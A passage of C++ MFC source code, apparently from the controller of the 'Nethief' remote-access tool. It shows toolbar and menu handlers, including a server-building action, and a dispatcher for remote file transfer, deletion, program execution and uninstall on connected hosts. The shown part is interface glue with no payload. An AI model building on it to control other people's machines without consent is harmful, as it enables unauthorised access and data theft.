	// TODO: Add your command handler code here
	if(!IsActivePane(0,0))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnToolbarDeletehost();
}

void CMainFrame::OnToolbarDisconnect() 
{
	// TODO: Add your command handler code here
	if(!IsActivePane(0,0))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
	m_pDoc->OnToolbarDisconnect();
}

void CMainFrame::OnMenuNetUninstall() 
{
	// TODO: Add your command handler code here
	if(!IsActivePane(0,0))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnMenuNetUninstall();
}

void CMainFrame::OnMenuNetNote() 
{
	// TODO: Add your command handler code here
	if(!IsActivePane(0,0))
	{
		MessageBeep(0xFFFFFFFF);
		return;
	}
    m_pDoc->OnMenuNetNote();
}

void CMainFrame::OnToolbarStop() 
{
	// TODO: Add your command handler code here
    m_pDoc->OnToolbarStop();
}

void CMainFrame::OnToolbarBuildserver() 
{
	// TODO: Add your command handler code here
    m_pDoc->OnToolbarBuildserver();
}

void CMainFrame::OnMenuNetOption()
{
	// TODO: Add your command handler code here
	m_pDoc->OnMenuNetOption();
}

void CMainFrame::OnMenuNetDownload() 
{
	// TODO: Add your command handler code here
	m_pDoc->OnMenuNetDownload();
}

/////////////网络工具栏结束////////////////////
void CMainFrame::OnHelpReadme() 
{
	// TODO: Add your command handler code here
	CString exeFullPath;      //用于保存当前执行程序路径
	GetModuleFileName(NULL,   //得到路径
		exeFullPath.GetBufferSetLength(MAX_PATH),MAX_PATH);
	exeFullPath.GetBufferSetLength(exeFullPath.ReverseFind('\\')+1);  //找到
	exeFullPath.ReleaseBuffer();
	CString strLogFileName=exeFullPath+"Readme.txt";  //源文件名

	ShellExecute(NULL,NULL,strLogFileName,NULL,exeFullPath,SW_SHOWMAXIMIZED);	
}

void CMainFrame::OnHelpHomepage() 
{
	// TODO: Add your command handler code here
	ShellExecute(NULL,NULL,"http://www.greenstuffsoft.net/"
		,NULL,NULL,SW_SHOWNORMAL);	
}

void CMainFrame::OnHelpEmail() 
{
	// TODO: Add your command handler code here
	CNethiefApp* app=(CNethiefApp*)AfxGetApp();
	ShellExecute(NULL,NULL,
		"mailto:webmaster@greenstuffsoft.net?subject=关于 "+app->m_strVersion
		,NULL,NULL,SW_SHOWNORMAL);
}

void CMainFrame::OnHelpUpdate()
{
	// TODO: Add your command handler code here
	m_pDoc->OnHelpUpdate();
}

BOOL CMainFrame::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
	// TODO: Add your message handler code here and/or call default
	if(m_pDoc->m_bIsBusy)
	{
		SetCursor(m_hCursor);
		return TRUE;
	}
	return CFrameWnd::OnSetCursor(pWnd, nHitTest, message);
}
////////////////////////////////////////////////////////////////
void CMainFrame::OnSocket(WPARAM wParam,LPARAM lParam)
{
	DWORD dwEvent=lParam;
	switch(dwEvent)
	{
		case FD_ACCEPT:
		{
			m_pDoc->OnSocketAccept();
			break;
		}
	}	
}

void CMainFrame::OnWorkThread(WPARAM wParam,LPARAM lParam)
{
	DWORD dwThreadMessage=wParam;
	DWORD dwResult=lParam;
	switch(dwThreadMessage)
	{
		case CMD_NOTIFYCONNECT:
		{
			m_pDoc->OnTM_NotifyConnect(dwResult);
			break;
		}
		case CMD_IDVERIFY:
		{
			m_pDoc->OnTM_IDVerify(dwResult);
			break;
		}
		case CMD_DOWNLOADDISKDRIVEINFO:
		{
			m_pDoc->OnTM_DownloadDiskDriveInfo(dwResult);
			break;
		}
		case CMD_EXPANDDIRECTORY:
		{
			m_pDoc->OnTM_ExpandDirectory(dwResult);
			break;
		}
		case CMD_SHOWFILELIST:
		{
			m_pDoc->OnTM_ShowFileList(dwResult);
			break;
		}
		case CMD_RENAMEFILE:
		{
			m_pDoc->OnTM_RenameFile(dwResult);
			break;
		}
		case CMD_NEWFILE:
		{
			m_pDoc->OnTM_NewFile(dwResult);
			break;
		}
		case CMD_NEWFOLDER:
		{
			m_pDoc->OnTM_NewFolder(dwResult);
			break;
		}
		case CMD_DELETEFILE:
		{
			m_pDoc->OnTM_DeleteFile(dwResult);
			break;
		}
		case CMD_REMOTEPASTE:
		{
			m_pDoc->OnTM_RemotePaste(dwResult);
			break;
		}
		case CMD_GETOPERATIONOBJECT:
		{
			m_pDoc->OnTM_GetOperationObject(dwResult);
			break;
		}
		case CMD_DOWNLOADFILE:
		{
			m_pDoc->OnTM_DownloadFile(dwResult);
			break;
		}
		case CMD_UPLOADFILE:
		{
			m_pDoc->OnTM_UploadFile(dwResult);
			break;
		}
		case CMD_SHOWPROPERTY_MULTI:
		{
			m_pDoc->OnTM_ShowProperty_Multi(dwResult);
			break;
		}
		case CMD_SHOWPROPERTY_SINGLE:
		{
			m_pDoc->OnTM_ShowProperty_Single(dwResult);
			break;
		}
		case CMD_MODIFYPROPERTY_SINGLE:
		{
			m_pDoc->OnTM_ModifyProperty_Single(dwResult);
			break;
		}
		case CMD_SHOWPROPERTY_DISKDRIVE:
		{
			m_pDoc->OnTM_ShowProperty_Diskdrive(dwResult);
			break;
		}
		case CMD_MODIFYPROPERTY_DISKDRIVE:
		{
			m_pDoc->OnTM_ModifyProperty_Diskdrive(dwResult);
			break;
		}
		case CMD_REMOTERUN:
		{
			m_pDoc->OnTM_RemoteRun(dwResult);
			break;
		}
		case CMD_REMOTEUNINSTALL:
		{
			m_pDoc->OnTM_RemoteUninstall(dwResult);
			break;
		}
		case CMD_FINDFILE:
		{
			m_pDoc->OnTM_FindFile(dwResult);
			break;
		}
		case CMD_SHOWNOTE:
		{
			m_pDoc->OnTM_ShowNote(dwResult);
			break;
		}
		case OTR_REFRESHSTATUSBAR:
		{
			m_pDoc->OnTM_RefreshStatusBar(dwResult);
			break;
		}
		case CMD_GETFILEINFO:
		{
			m_pDoc->OnTM_GetFileInfo(dwResult);
			break;
		}
	}	
}
